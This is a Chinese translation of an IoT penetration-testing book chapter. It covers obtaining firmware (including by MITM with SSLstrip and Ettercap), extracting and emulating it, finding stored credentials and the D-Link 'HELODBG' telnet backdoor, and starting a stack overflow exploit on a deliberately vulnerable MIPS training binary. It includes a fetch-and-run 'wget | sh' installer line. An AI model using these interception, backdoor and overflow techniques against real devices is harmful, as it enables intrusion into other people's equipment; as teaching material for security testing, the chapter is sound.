# 分析和利用固件

在本章中，我们将涵盖以下内容：

+   定义固件分析方法

+   获取固件

+   分析固件

+   分析文件系统内容

+   模拟固件进行动态分析

+   开始使用 ARM 和 MIPS

+   利用 MIPS

# 介绍

到目前为止，我们已经介绍了物联网生态系统的基础知识，并通过威胁建模识别了其相应的风险，以帮助我们的测试。一些漏洞和威胁可能更容易通过对正在使用的技术进行侦察来识别。在本章中，我们将把精力完全集中在逆向工程固件上，以分析其内容以在运行时进行操纵。我们将讨论如何分解固件，如何分析固件内容，其架构，使用常见固件工具，以及如何修改固件以进行恶意用途。与其他软件逆向工程方法一样，分析固件绝对是一门艺术。您将了解到一些工具将帮助我们寻找常见的缺陷；然而，分析固件二进制镜像的安全性在很大程度上是一个手动过程。

在开始分析固件之前，重要的是讨论获取固件的一般方法以及哪些数据对我们来说是重要的。这一步可能已经在之前对固件进行轻量级威胁建模的过程中完成，但让我们从讨论固件分析的目标开始。

# 定义固件分析方法

固件是控制物联网设备的中心，这就是为什么我们可能希望在分析设备的其他部件之前先分析其内容。根据您的物联网设备所制造的行业，获取固件镜像并分解其内容可能是微不足道的。同样，一些行业领域需要特定的保障措施，这可能会使逆向工程变得更加困难和/或耗时。然而，在分析固件时，我们将寻找一些常见的模式。通常，评估者的最常见目标是定位以下内容：

+   密码

+   API 令牌

+   API 端点（URL）

+   易受攻击的服务

+   后门账户

+   配置文件

+   源代码

+   私钥

+   数据存储方式

在接下来的内容中，我们在分析固件时将有相同的目标。本篇将向您展示固件分析和逆向工程的概述方法。

以下是分析物联网固件的基本方法论列表：

1.  获取固件

1.  分析固件

1.  提取文件系统

1.  挂载文件系统

1.  分析文件系统内容

1.  模拟固件进行动态分析

# 获取固件

为了开始审查固件内容，我们首先必须获取固件二进制文件。本节将介绍获取给定目标的固件的各种技术。

# 准备工作

要获取固件，我们需要安装一些工具。我们将使用 Kali Linux，默认情况下已安装了大部分我们需要的工具。以下是您需要的工具：

+   **Kali Linux**：Kali Linux 可以通过他们的网站[`www.kali.org/downloads/`](https://www.kali.org/downloads/)下载。建议在使用 VMware 或 VirtualBox 时使用 Kali 虚拟镜像，可以在这里找到[`www.offensive-security.com/kali-linux-vmware-virtualbox-image-download/`](https://www.offensive-security.com/kali-linux-vmware-virtualbox-image-download/)。

+   **Ettercap**：虽然 Kali Linux 默认安装了 Ettercap，但也可以通过[`ettercap.github.io/ettercap/downloads.html`](https://ettercap.github.io/ettercap/downloads.html)下载。

+   **Wireshark**：Wireshark 默认包含在 Kali Linux 中，也可以在[`www.wireshark.org`](http://www.wireshark.org)下载。

+   **SSLstrip**：SSLstrip 默认包含在 Kali Linux 中，也可以通过[`github.com/moxie0/sslstrip`](https://github.com/moxie0/sslstrip)下载。

+   **Flashrom**：Flashrom 默认情况下不包含在 Kali Linux 中，但我们可以使用以下命令轻松安装该工具：

```
apt-get install flashrom  
```

另外，可以通过[`www.flashrom.org/Downloads`](https://www.flashrom.org/Downloads)下载 flashrom。

# 如何做...

有几种方法可以从物联网设备获取固件。我们将在本教程中介绍大多数方法。固件图像可以通过以下方法获取：

+   从供应商的网站下载

+   在设备更新期间代理或镜像流量

+   直接从设备中转储固件

+   谷歌/研究

+   反编译相关移动应用程序

# 从供应商的网站下载

获取固件的最简单方法是通过供应商的网站。

以下截图演示了如何从供应商网站获取固件图像：

1.  导航到目标供应商的网站。

1.  在搜索栏中输入目标设备：

![](img/e8a1430a-7e62-47b7-a30b-9d64f284e2e0.png)

1.  选择“支持”选项卡：

![](img/a9b1b1f4-23c2-4e87-998e-3263c68bcdd9.png)

1.  选择“驱动程序和工具”按钮：

![](img/41c21cf6-3d0f-46d2-b3e7-71c04db66105.png)

1.  单击下载链接：

![](img/6a9845e4-2f91-4372-94a7-eec51b7943ee.png)

1.  或者，您可以选择复制链接地址，通过`wget`在测试机器上下载文件（`wget <http://URL.com>`）：

![](img/6a7ed2cc-206e-4bc7-a1a7-a768cd7ef365.png)

# 在设备更新期间代理或镜像流量

有时，通过供应商的网站获取固件可能不是一个选择，您将不得不执行步骤 2，在设备更新期间代理流量，或步骤 3，直接从设备中转储固件。为了在设备更新期间代理流量，您必须是**中间人**（**MITM**）或在更新功能期间镜像设备流量。另外，也可以代理 Web 或移动应用程序，以便获取固件下载的 URL。

您可能还需要调整用户代理标头，因为供应商已知会验证固件下载的这个值。以下是在 Kali Linux、Ettercap、Wireshark 和 SSLstrip 上执行设备 MITM 的基本步骤：

有几种方法和工具可以用于 MITM 流量到目标设备和从目标设备。下面的示例只是一种捕获设备流量的方法。

1.  启用 IP 转发：

```
echo 1 > /proc/sys/net/ipv4/ip_forward

```

1.  配置`iptables`将目标端口`80`的流量重定向到 SSLstrip 监听的端口`1000`：

```
iptables -t nat -p tcp -A PREROUTING --dport 80 -j REDIRECT --to-port 10000

```

1.  启动 SSLstrip：

```
ssltrip -a

```

1.  启动 Ettercap GUI：

```
ettercap -G

```

1.  以下图显示了我们当前的步骤：

![](img/a034a581-0b20-4757-9824-da8e98af6627.png)

1.  单击“嗅探”菜单和“统一嗅探...”选项：

![](img/2295f7bb-cae1-4183-9d73-3def839532ee.png)

1.  选择接口：

![](img/0ffb4360-b7b8-42f8-832b-2ac0de78881d.png)

1.  选择扫描主机：

![](img/91334e90-83ed-4478-8014-1e2c80c38cfc.png)

1.  打开 Wireshark 查看流量：

![](img/487ff5b0-8f22-4b5f-b5b4-180f64ec9a53.png)

1.  通过单击“开始捕获数据包”来从目标设备捕获流量：

![](img/52da8dfb-c021-4fc6-b4d6-4e9c40c5e0eb.png)

1.  根据需要过滤流量；在本例中，`192.168.1.137`是目标设备：

![](img/f6338392-0cc3-45b8-a202-718f5e13ccc8.png)

# 直接从设备中转储固件

如果我们无法通过供应商网站或代理其流量获取固件，我们可以开始通过 UART、SPI 或 JTAG 转储设备固件。直接转储固件需要访问设备并拆卸设备以找到其闪存存储器。一旦找到闪存存储芯片，您可以直接连接您的 UART 引脚，或者使用 8 引脚 SOIC 芯片夹通过 flashrom 和 SPI 启用的硬件板（如 Shikra）转储固件。以下是 SOIC 夹和 Shikra 如何连接到设备的方法：

>![](img/2da9bdbd-c7ca-41fb-85d3-399a2e8e2ecf.png)

图片来源：[`www.xipiter.com/uploads/2/4/4/8/24485815/9936671_orig.jpg?562`](http://www.xipiter.com/uploads/2/4/4/8/24485815/9936671_orig.jpg?562)

用于将固件内容转储到 bin 文件的命令如下：

```
$ flashrom -p ft2232_spi:type=232H -r spidump.bin 

```

如果我们使用 flashrom 或之前描述的任何方法获取了设备的固件，现在我们需要分析固件二进制文件。

# 谷歌搜索

如果由于某种原因我们无法通过之前列出的方法获取固件映像，我们的最后选择是求助于谷歌。如果我们想依赖他人的工作或检查我们的设备是否被研究过，这可能不是我们的最后选择。还有可能是当前或前员工可能已经将固件文件上传到他们的个人存储库或 Web 服务器。无论如何，我们可以使用谷歌搜索技术来缩小我们对给定目标设备的搜索范围。我们还可以利用谷歌黑客数据库来搜索固件或设备，网址为[`www.exploit-db.com/google-hacking-database`](https://www.exploit-db.com/google-hacking-database)。

# 工作原理...

在这个教程中，我们通过从供应商的网站获取固件映像以及设置 MITM 测试平台来捕获设备流量，直接从设备中转储固件以及作为最后手段进行谷歌搜索。在这里，我将解释为什么我们要通过这些方法获取固件。

当从供应商那里下载固件文件时，您通常可以通过他们的支持网站、文件共享或社区论坛找到所需的内容。有时供应商会要求输入密码才能下载文件，或者将固件密码保护在 ZIP 文件中。如果是这种情况，出于时间考虑，我们很可能会直接跳过获取固件的下一步。

接下来，我们将介绍如何使用 Kali Linux、SSLstrip、Ettercap 和 Wireshark 设置 MITM 测试平台，以捕获设备更新期间的设备流量。

# 分析固件

一旦我们拥有了固件，现在的主要步骤是分析固件。这涉及查看固件内部并尝试识别尽可能多的安全问题，这就是我们将在本节中进行的工作。

# 准备工作

在这一部分，我们将了解一旦获得固件二进制包，如何分析固件。我们可以使用几种不同的技术来查看固件并识别其中的安全问题，我们将在本节中介绍如何入门并识别一些常见的安全问题。

如前所述，固件对于渗透测试人员来说包含许多有趣的东西，包括 API 密钥、私人证书、硬编码凭据、后门等。

# 操作步骤...

为了分析固件，我们必须对其进行逆向工程，以查看其内部组件。固件的内部组件涉及引导加载程序、内核、文件系统和其他资源等内容。在这些内容中，我们最感兴趣的是文件系统，因为这将为我们保存所有的秘密。显然，你可以玩弄引导加载程序并查看它所保存的内容，或者修改它并创建新的固件（我们将在接下来的部分讨论），但在这个时候，我们只关心如何对固件进行逆向工程并从中提取文件系统。

固件，正如我们所知，是一个二进制文件包，文件系统只是可以存储在二进制文件中特定偏移量处并具有特定大小的组件之一。但是，此时我们尚不知道固件内部文件系统的任何信息，包括偏移量和大小。要找出这些信息，我们需要使用诸如`hexdump`和`grep`之类的工具来查找我们正在寻找的各种内容的签名。以下是 Squashfs 文件系统的示例：

1.  如果我们想要查找 Squashfs 文件系统，我们可以在逆序中使用`hexdump`输出来`grep` `shsq`（这是任何 Squashfs 文件系统的魔术字节）如下所示：

![](img/a691594b-1525-4a6e-8ee1-9f123fe6f293.png)

1.  如您所见，我们能够确定 Squashfs 文件系统从地址`0x000e20c0`开始。一旦我们获得了这些信息，我们就可以使用`dd`实用程序从此位置开始转储内容直到结束，如下所示：

![](img/22a1830b-2db7-4e45-a0b2-173203883026.png)

1.  一旦我们从固件二进制文件中切割出 Squashfs 内容，我们就可以简单地运行诸如`unsquashfs`之类的实用程序来查看整个文件系统。

让我们继续运行`unsquashfs`，看看我们是否可以查看整个文件系统：

![](img/231b08e9-cd93-4731-b035-9215369f9e13.png)

1.  从上面的屏幕截图中可以看出，我们能够提取 Squashfs 文件系统映像。请忽略上图中的警告和错误，因为它只是在抱怨我们没有以 root 用户身份运行命令。一旦我们提取了它，我们就可以转到各个目录并查看各个文件，以识别漏洞。以下是整个文件系统的屏幕截图：

![](img/9f5d8de3-ba20-43e7-82a6-4fe6735ac1e3.png)

这就是我们如何反向工程固件并从固件二进制映像中提取文件系统。我们还可以使用 Binwalk 等工具自动执行前面提到的所有步骤。由*Craig Heffner*编写，它允许我们仅使用一个命令从固件二进制映像中提取文件系统。

1.  要安装 Binwalk，只需克隆位于[`github.com/devttys0/binwalk.git`](https://github.com/devttys0/binwalk.git)的 Binwalk 的 GitHub 存储库，如下所示：

```
git clone https://github.com/devttys0/binwalk.git

```

1.  运行`./deps.sh`以安装所有必需的依赖项和二进制文件。

1.  安装 Binwalk 成功后，您可以通过简单输入`binwalk`并按*Enter*来确认。这应该显示 Binwalk 的帮助菜单：

![](img/3664de5c-7156-4dd7-bf4d-940aa37bf7d3.png)

1.  让我们继续使用 Binwalk 从相同的固件中执行文件系统提取。为此，我们将使用`-e`标志进行提取：

```
binwalk -e [firmware-name]

```

1.  这将向我们展示固件中存在的各个部分，并为我们提取内容：

![](img/0dd734fb-9074-4629-b4e5-1073c269d496.png)

1.  `t`和`vv`标志只是允许我们以更易读和详细的格式打印输出。Binwalk 执行后，我们可以转到名为`_[firmwarename].extracted`的目录，其中将保存整个文件系统，如下面的屏幕截图所示：

![](img/f854a40f-4dd9-49e5-a998-392ab5701b61.png)

这就是我们如何从固件二进制文件中手动和自动提取文件系统。

# 工作原理...

在这种情况下，文件系统提取使用了我们之前执行的相同方法。它使用魔术字节和头部签名字符（例如 Squashfs 的`sqsh`等）来检测文件系统和其他组件的偏移量。Binwalk 检测到的文件系统数量可以在此 URL 找到：[`github.com/devttys0/binwalk/blob/62e9caa164305a18d7d1f037ab27d14ac933d3cf/src/binwalk/magic/filesystems`](https://github.com/devttys0/binwalk/blob/62e9caa164305a18d7d1f037ab27d14ac933d3cf/src/binwalk/magic/filesystems)。

您还可以手动向 Binwalk 实例添加更多签名并编译它以检测这些额外的文件系统。

# 还有更多...

您还可以使用 Binwalk 执行许多其他操作，例如检测给定固件映像的熵。这可以帮助您确定固件映像是否被压缩或加密。为了执行熵分析，请像下面的截图中所示，使用带有`-E`标志的`binwalk`，后跟固件名称：

![](img/7932f99a-c60d-49cd-abd1-106af4aa45ef.png)

正如您在前面的截图中所看到的，这个特定的固件似乎没有加密，因为在加密固件映像中会找到的大量变化缺失。

# 另请参阅

+   有关固件分析和逆向工程的其他信息，Binwalk 的作者*Craig Heffner*的博客非常有用。它还将帮助您了解不同的固件映像是如何变化和易受攻击的。该博客位于[`www.devttys0.com/`](http://www.devttys0.com/)。

# 分析文件系统内容

现在我们知道如何对固件进行逆向工程并从中提取文件系统，本节中我们将查看文件系统内容，并对其进行额外的漏洞分析。这将帮助我们更深入地了解如何在固件映像中找到安全问题，借此我们将能够破坏物联网设备。

# 准备工作

有两种分析文件系统内容的方法：

+   手动分析。

+   自动化工具和脚本。

# 手动分析

在固件文件系统内容中寻找漏洞的方法中，我们对文件系统中存在的各种文件和文件夹进行分析。这可能涉及查看配置文件、web 目录、密码文件、寻找后门等。这是发现给定固件中漏洞的理想方式，也是我们本节的重点。

# 自动化工具和脚本

在撰写本书的日期之前，除了一些脚本外，没有一个完整的套件框架或工具可以帮助我们发现固件中的漏洞。因此，如果您熟悉 Web 应用程序安全或网络安全，就没有类似于 Arachni、w3af、Metasploit 或类似工具。

# 如何操作...

让我们开始分析固件，看看我们是否能够识别出任何敏感信息或后门。

我们将用于此练习的固件是版本为`DWR-932_fw_revB_2_02_eu_en_20150709`的 D-Link DWR 932B。这些漏洞是由安全研究人员*Gianni Carabelli*和*Pierre Kim*发现的：

1.  第一步是从固件中提取文件系统。但是，在这种情况下，固件是一个受密码保护的 ZIP 文件。这种情况下，可以使用 fcrackzip 等实用程序来破解密码，密码被发现是 UT9Z。这也显示在下面的截图中：

![](img/eef7ca24-c6fb-4a96-908b-3c5a62efd6fe.png)

1.  一旦我们有了固件映像，我们可以使用 Binwalk 来提取固件 ZIP 文件中存在的 yaffs2 文件系统。您可以使用 yaffs2 特定工具来解压文件系统，或者简单地使用 Binwalk 也可以完成任务。

1.  在`yaffs2-root`文件夹中，我们将看到整个文件系统，如下面的截图所示：

![](img/0102900b-ed0e-4f1a-8fc1-fc88c4353b05.png)

1.  从这里开始，我们可以开始浏览各个目录，并查看从安全角度看起来有趣的文件。我们可以首先运行一个`find`查询，查找所有`.conf`文件，如下面的截图所示：

![](img/f410244b-8d4e-4cd0-a4f0-31e9554e5a83.png)

1.  例如，这是`wpa-supplicant.conf`文件中的内容：

![](img/8d9c7042-7d31-438a-9767-6c98cd1cee9c.png)

1.  让我们看看其他文件，比如`inadyn-mt.conf`：

![](img/f68a1e86-4bc6-4f1f-9e7a-8915dcef2aa7.png)

令人惊讶的是，这个文件包含了高度敏感的信息，根本不应该被访问。正如我们从前面的屏幕截图中所看到的，这个文件存储了路由器的 no-IP 配置，包括用于[`www.no-ip.com`](https://www.no-ip.com)访问的用户名和密码组合。

这就是我们如何在固件中找到隐藏的敏感信息。您显然可以继续寻找更多，并在固件文件系统中识别更多敏感信息。

现在我们知道如何对固件进行手动分析后，我们将继续通过自动化方法来识别漏洞。为此，我们将使用一个名为 Firmwalker 的工具，这个工具是由*Craig Smith*编写的，它通过静态分析帮助识别固件中一些常见的敏感信息。

1.  要设置它，我们只需要克隆 Firmwalker 的 GitHub 存储库，如下所示：

```
git clone https://github.com/craigz28/firmwalker.git
```

1.  一旦我们克隆了 Firmwalker 的 GitHub 存储库，我们只需要运行`./firmwalker.sh`脚本，然后跟随提取的文件系统位置，如下所示：

```
./firmwalker.sh ~/lab/firmware/dlink/r2/v2/_2K-mdm-image-mdm9625.yaffs2.extracted/yaffs-root

```

1.  Firmwalker 脚本为我们识别了许多不同的内容，包括额外的二进制文件、证书、IP 地址、私钥等。它还将输出存储在一个名为`firmwalker.txt`的文件中（除非用户指定了不同的文件），其外观如下所示：

![](img/61028b37-9e0b-4a02-a297-525c56bd217f.png)

一旦我们有了 Firmwalker 生成的报告，我们可以逐个查看所有不同的文件并进一步分析它们。在某些情况下，您还需要对 ARM 和 MIPS 架构的二进制文件进行逆向工程，以更好地理解它们并识别漏洞。

# 它是如何工作的...

分析和理解文件系统及其内部内容完全取决于您的手动评估技能。这就是您能够识别漏洞的方法。即使在使用各种工具时，您也会意识到，最终归根结底是手动分析二进制文件或文件，并找出其中的漏洞。

# 还有更多...

要更深入地分析固件文件系统内容，您还可以使用固件差异技术，通过它您可以比较一个固件与其先前版本，并查看其中的差异。这将使您能够了解新版本中进行的安全修复和修改，并识别以前版本中甚至未公开的安全问题。

我们还可以对固件文件系统内容进行的另一项操作是查看已使用的各种库和组件，看看这些组件是否是带有漏洞的过时版本。

# 另请参阅

+   要分析固件文件系统内容，还可以阅读更多关于二进制分析和逆向工程的内容。熟悉 Linux 二进制分析、调试和在 ARM 和 MIPS 等平台上的反汇编。

# 用于动态分析的固件模拟

在使用物联网设备时，其中一个限制是我们无法在没有实际设备访问权限的情况下进行大量测试和利用。然而，在本节中，我们将讨论一种方法，您可以模拟您的固件，并与模拟设备进行交互，就像它是实际放置在您的网络上的设备一样。

# 准备就绪

为了模拟固件，我们将使用一种名为**固件分析工具包**（**FAT**）的脚本，这个脚本是由本书的作者编写的。FAT 使用 Firmadyne 来执行固件映像的模拟。

Firmadyne 使用的基础实用程序是 QEMU，它允许用户模拟整个系统架构并在其上运行内容。它还利用了工具作者编写的其他脚本，例如位于[`github.com/firmadyne/libnvram`](https://github.com/firmadyne/libnvram)的 NVRAM 模拟器。它还使用我们之前讨论过的 Binwalk 等工具，从固件中提取文件系统，然后进行模拟。

让我们继续克隆 FAT GitHub 存储库并设置它，使实验室准备好进行模拟。强烈建议在基于 Ubuntu 的系统上执行此操作，以避免在模拟过程中出现任何问题。

# 如何做...

以下是步骤：

1.  我们将通过以下链接[`github.com/attify/firmware-analysis-toolkit/`](https://github.com/attify/firmware-analysis-toolkit/)开始克隆 FAT 存储库的设置：

```
git clone --recursive https://github.com/attify/firmware-analysis-toolkit.git
cd firmware-analysis-toolkit && sudo ./setup.sh

```

这也将设置 Firmadyne 用于存储有关固件的信息和将来管理的数据库。数据库的密码将设置为`firmadyne`。

一旦您设置好了一切，就该是我们选择固件并模拟它，看看我们能够用模拟的固件执行什么了。

对于这个练习，我们将使用 D-Link 为其无线 PoE 接入点提供的固件 DWP2360b。

1.  我们需要做的第一件事是运行`./fat.py`，然后它会要求您输入固件名称和固件镜像的品牌。这个固件品牌镜像纯粹是为了数据库目的，这样我们以后如果需要的话就可以在数据库中查看我们模拟了哪个品牌的固件。运行后，它将显示如下截图所示：

![](img/c7a7bac4-badb-42c8-9ce0-57fe89b8cf5a.png)

1.  它会几次要求您输入数据库密码，我们已将其设置为`firmadyne`。一旦完成初始处理，创建图像，设置网络并获取 IP 地址，它将显示 FAT 向您显示 IP 地址并提到固件现在已经被模拟，如下截图所示：

![](img/41b28add-4f71-4fc8-a1ae-c7f515a06b9e.png)

1.  一旦我们有了 IP 地址，我们可以简单地在浏览器中打开它，我们将看到路由器登录页面，如下截图所示：

![](img/edb94a5b-10f3-40d8-9b2a-4206b23a881c.png)

这就是我们如何在没有访问设备的情况下使用 FAT 来模拟固件。

# 工作原理...

前面的模拟是基于 QEMU 和 NVRAM 模拟器的。NVRAM 是固件访问以获取设备信息的组件。然而，由于没有物理设备存在，这将导致错误或服务崩溃。这就是 NVRAM 模拟器发挥作用的地方。Firmadyne 工具包还修改固件以进行调试，以便用户访问控制台。

以下是 FAT 脚本中正在发生的事情：

1.  从固件中提取文件系统。

1.  获取固件的架构。

1.  制作所需的镜像。

1.  设置网络。

1.  模拟镜像。

所有这些步骤都可以手动执行，但是拥有像 FAT 这样的脚本可以加快速度。

# 还有更多...

进行模拟的另一种方法是手动下载适当架构的 Debian 镜像，并将文件从固件复制到新创建的 Debian 实例中，然后使用 Chroot 运行 Web 服务器（或正在测试的组件）。您可以从[`people.debian.org/~aurel32/qemu/`](https://people.debian.org/~aurel32/qemu/)下载现有的 Debian 镜像。

# 开始使用 ARM 和 MIPS

现在我们知道如何模拟固件并进行基本分析，您经常会发现自己遇到需要进行额外分析的各种二进制文件。在一本书中不可能涵盖嵌入式设备可能的所有不同架构，我们将专注于两种流行的架构-ARM 和 MIPS。

然而，我们只会研究 MIPS 的利用，并稍微了解 ARM 的逆向工程。从利用的角度来看，ARM 和 MIPS 非常相似，学习一种架构将为您提供另一种架构的基础知识和基本理解。

# 准备工作

我们将从对 D-Link 固件中发现的后门进行非常基本的分析开始我们的二进制分析之旅。这个后门是由*Pierre Kim*发现的。要识别这个后门，需要对基于 ARM 的二进制文件有一个基本的逆向工程概念。尽管我们不会深入讨论寄存器和体系结构（因为我们将在 MIPS 体系结构中进行讨论），但这一部分将帮助您了解分析二进制文件并识别低悬漏洞的过程。

在这种情况下，我们将使用 D-Link DWR 932B 设备的固件。一旦我们使用 Binwalk 提取了这个固件，我们注意到有一个名为 appmgr 的二进制文件，这就是我们感兴趣的内容。

我们可以使用您熟悉的任何反汇编器 - Radare2、IDA、Hopper 等。在这种情况下，我们将使用 Hopper 来反向工程 appmgr 二进制文件，这是一个 ARM Little Endian 二进制文件。

# 如何做...

我们将使用 Hopper 的伪代码生成功能来更好地理解它。以下是步骤：

1.  让我们加载二进制文件到 Hopper 进行分析：</li>

![](img/25f7b2fd-5c59-42fb-8565-44589dba8e7e.png)

1.  一旦我们加载了二进制文件，我们就可以搜索`telnet`字符串，然后就能在代码示例中的某个地方看到`telnet`的提及：

![](img/d31c904e-953f-4f75-857c-d5f465e0a42a.png)

在字符串中查找 telnet 实例

1.  为了找出它是从哪里调用的，我们可以右键单击字符串，然后选择引用地址，这将显示调用它的位置和指令。在这种情况下，如果我们引用地址，我们发现它是从`0x13048`调用的，如下面的截图所示：

![](img/f8e566bb-1585-4bbf-9ee2-9e1a652d0e1e.png)

1.  双击地址将带我们到所提到的地址，这种情况下是`0x13048`。一旦我们到达地址，我们可以看到整个反汇编，以及通过点击“伪代码模式”按钮生成伪代码。这也显示在下面的截图中：

![](img/4f94c593-3dbd-49ec-b969-364bdc0d2605.png)

从反汇编中访问伪代码

1.  伪代码功能对我们非常有用，因为它让我们将反汇编视为一个逻辑程序，这样对我们来说更有意义，如果我们对反汇编不是非常熟悉的话。在这种情况下，伪代码的内容如下：

![](img/b60d7347-bc03-4420-9aad-952a0373edde.png)

正如我们从前面的截图中所看到的，它对字符串`HELODBG`进行了`strncmp`。您可能已经知道，`strncmp`用于字符串比较，在这种情况下是检查二进制文件所需的字符串，以启动 Telnet，这一点从高亮的框中可以看出。

因此，我们可以自信地说，appmgr 后门寻找字符串`HELODBG`，一旦接收到该字符串，就会启动带有`bin/sh` shell 的 Telnet。

这就是我们对 ARM 二进制文件进行非常基本分析的方式，可以用来查找敏感信息或漏洞，以及后门。

# 还有更多...

现在您知道如何对 ARM 二进制文件进行基本分析，我们还建议您阅读更多关于 ARM 汇编和其体系结构的内容。对汇编指令和底层体系结构的知识和理解将帮助您更好地理解反汇编，即使在伪代码无法帮助的情况下也是如此。

# 利用 MIPS

现在我们已经对如何反向工程二进制文件有了基本的了解，是时候深入了解利用和理解大多数 IoT 设备所基于的平台的体系结构了。为了获得基本的理解，我们现在只关注 MIPS，但强烈建议您使用相同的概念并在基于 ARM 的体系结构上进行利用。

# 准备工作

进行 MIPS 利用，我们主要会使用 QEMU 和 chroot 技术，这是我们在本章前面简要介绍过的。我们将研究如何在 MIPS 二进制文件上执行缓冲区溢出利用，并改变程序执行流程，使其执行我们想要的操作，而不是二进制文件原本应该执行的操作。目前我们不会涉及**返回导向编程**（**ROP**）等概念，保持简单。

# 如何做...

对于这个练习，我们将需要并使用以下工具和实用程序：

+   **可恶的易受攻击路由器固件**（**DVRF**）-可从 GitHub URL 下载

+   GDB-Multiarch

+   **GDB 增强功能**（**GEF**）

+   QEMU

+   chroot

+   IDA Pro/Radare2（可选）

让我们逐个了解它们，并看看如何设置它们。让我们从以下 URL 下载 DVRF 固件：[`github.com/praetorian-inc/DVRF/tree/master/Firmware`](https://github.com/praetorian-inc/DVRF/tree/master/Firmware)。

DVRF 是由*b1ack0wl*编写的固件，适用于基于 MIPS 的平台。尽管该固件是为 Linksys E1550 设计的，但可以在使用 QEMU 的模拟环境中运行，也包括执行利用：

1.  现在我们有了固件，让我们继续安装 GDB（GNU 调试器）和 GEF，以便在利用过程中进行调试：

```
sudo apt install gdb-multiarch 
# Installing GEF 
sudo pip3 install capstone unicorn keystone-engine
wget -q -O- https://github.com/hugsy/gef/raw/master/gef.sh | sh  
```

还要确保您的系统上安装了所需的 QEMU 软件包。现在我们已经准备就绪，让我们继续使用二进制仿真来运行其中一个二进制文件，利用 QEMU 的功能。

1.  为此，我们需要首先使用 Binwalk 从固件中提取文件系统，如下截图所示：

![](img/29ca73c7-dc1e-45d5-88c4-50307da2536a.png)

1.  一旦我们提取了文件系统，我们可以将相应架构的 QEMU 二进制文件复制到我们的根文件夹中，本例中是`squashfs-root`，如下所示。但在这之前，让我们确认一下我们的目标二进制文件是否是针对 MIPS 架构的二进制文件：

```
>> readelf -h pwnable/Intro/stack_bof_01
ELF Header:
Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00
Class:                             ELF32
Data:                              2's complement, little endian
Version:                           1 (current)
OS/ABI:                            UNIX - System V
ABI Version:                       0
Type:                              EXEC (Executable file)
Machine:                           MIPS R3000
Version:                           0x1
Entry point address:               0x400630
Start of program headers:          52 (bytes into file)
Start of section headers:          3900 (bytes into file)
Flags:                             0x50001007, noreorder, pic,       
cpic, o32, mips32
Size of this header:               52 (bytes)
Size of program headers:           32 (bytes)
Number of program headers:         6
Size of section headers:           40 (bytes)
Number of section headers:         29
Section header string table index: 26
```

1.  如前面的截图所示，我们的二进制文件是针对 MIPS 架构的小端格式。

![](img/641cb935-8cb4-4238-9eb7-a8b85b7d568d.png)

1.  现在让我们继续将 MIPS 小端（mipsel）的 QEMU 二进制文件复制到我们当前的 squashfs-root 文件夹中：

```
cp $(which qemu-mipsel-static) .

```

1.  一旦我们将`qemu-mipsel-static`复制到当前目录，我们就可以使用更改根（`chroot`）实用程序以及 QEMU 来仿真并运行二进制文件，同时让二进制文件相信它的根文件夹是我们运行命令的当前文件夹。可以使用以下命令实现：

```
Sudo chroot . ./qemu-mipsel-static pwnable/Intro/stack_bof1  
```

1.  如下截图所示，我们能够运行这个二进制文件，尽管它最初是为另一种架构设计的。这是通过 QEMU 的仿真功能和`chroot`的更改根功能实现的。

![](img/6d12f136-9c52-49f4-bbb4-12bc7c5c6438.png)

1.  如我们从命令的输出中所见（如前面的截图所示），这个二进制文件需要参数才能运行。此外，如果我们查看二进制文件的源代码，我们会发现这个二进制文件容易受到基于堆栈的缓冲区溢出漏洞的影响。以下是`stack_bof1`二进制文件的源代码：

![](img/3967adf3-6e71-4e61-a766-aecd601750aa.png)

如前面的截图所示，`buf`缓冲区容易受到缓冲区溢出的影响，我们的溢出目标是修改程序流程，使其指向`dat_shell`的地址，以便从中利用此漏洞获得 shell。

1.  让我们通过使用 QEMU 和 chroot 以及附加的`-g`标志来调试这个程序，这将使 GDB 连接到进程，如下所示：

```
sudo chroot . ./qemu-mipsel-static -g 1234 ./pwnable/Intro/stack_bof1
```

1.  如您从以下截图中所见，程序执行已暂停，现在正在等待调试器连接：

![](img/4d1a23fe-2385-469e-ba1c-e20ae4028d12.png)

1.  现在执行已经暂停，我们可以启动 GDB 并设置目标为远程以及我们刚刚分配的端口。此外，我们将不得不将架构设置为 MIPS，以便在需要时能够正确地反汇编二进制文件：

![](img/9b7072b5-d229-48d0-9810-25ce3f9fa8e9.png)

1.  一旦连接了目标，您会发现进程已暂停，可以通过输入`c`来恢复。 

1.  我们还可以通过执行`info functions`来查看二进制文件中可用函数的列表，并从我们的渗透测试角度确定哪些函数可能是有趣的：

![](img/164ed18f-6f17-48c6-af4a-c559508756d1.png)

1.  让我们继续反汇编`main`函数并看看它的样子。为此，我们可以简单地执行`disass main`。

1.  正如我们从下面的屏幕截图中看到的，我们能够看到`main`函数的反汇编：

![](img/4f2ec92c-46c9-4ad0-95fe-59c198e0edd1.png)

如果您熟悉一些指令，您会发现这些指令很有用。反汇编以地址、指令和操作数的格式呈现。

MIPS 共有 32 个通用寄存器，包括`$zero`、`$at`、`$v0-$v1`、`c`、`$t0-$t9`、`$s0-$s7`、`$k0`、`$k1`、`$gp`、`$ra`、`$fp`和`$ra`。在所有这些寄存器中，`$a0-$a3`用于存储函数的参数，`$t0-$t9`用于临时数据存储，`$gp`是全局区指针（我们在利用过程中尽量不修改 GP），`$sp`是堆栈指针，`$fp`是帧指针，`$ra`是返回地址。还有一个额外的特殊目的寄存器称为**程序计数器**（**PC**），它存储下一条指令的内存地址，即当前正在执行的指令的下一条指令。

要控制基于 MIPS 的二进制程序的执行流程，我们只关心两个寄存器 - RA 和 PC。当处理基于 MIPS 的二进制文件时，您会意识到控制 PC 通常比 RA 更困难。因此，在这个练习中，我们将专注于控制 RA。

1.  由于我们知道我们正在处理的当前二进制文件`socket_bof`容易受到基于堆栈的缓冲区溢出的影响，让我们用一个极大的参数来运行它。为了生成参数，我们将使用 GEF 的模式创建功能，如下面的屏幕截图所示：

![](img/82bddf25-498c-4bd3-9b7b-29cad377e0fe.png)

1.  一旦我们生成了模式，我们可以使用之前生成的参数运行`stack_bof_01`，并查看是否能够溢出 RA。下面的屏幕截图显示了使用从 GEF 生成的自定义 300 字符长的参数运行程序：

![](img/0b82fc17-7a22-45a0-91b0-b797953262cf.png)

1.  正如预期的那样，由于`-g`标志，二进制执行状态已暂停，并且正在等待调试器连接。现在打开 GEF 终端窗口，输入`target`，如下面的命令和屏幕截图所示：

```
target remote 127.0.0.1:1234  
```

![](img/843e9d47-e5fc-44db-85c2-9993d6ceaa22.png)

